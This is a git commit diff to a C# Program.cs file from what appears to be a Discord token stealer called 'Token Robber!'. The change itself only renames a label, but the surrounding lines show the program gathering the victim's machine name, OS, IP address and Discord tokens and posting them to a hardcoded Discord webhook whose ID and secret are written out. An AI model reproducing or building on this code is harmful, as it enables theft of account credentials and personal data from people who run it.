fa15908d086dbe03c4e04d46d0ef6cc64b7304b1
EbicHecker <sxpremecrypt@pm.me>
2021-12-13 15:35:58 +0100

    Update Program.cs
    sheesh yessir

--- Program.cs
+++ Program.cs
@@ -7,7 +7,7 @@ StringBuilder content = new StringBuilder()
     .AppendLine($"Machine Name: {Environment.MachineName}")
     .AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})")
     .AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}")
-    .AppendLine("Tokens: ");
+    .AppendLine("Token(s): ");
 await Parallel.ForEachAsync(TokenParser.Parse(), async (token, cts) => await AppendDiscordUserSummary(token, cts));
 using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
 await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
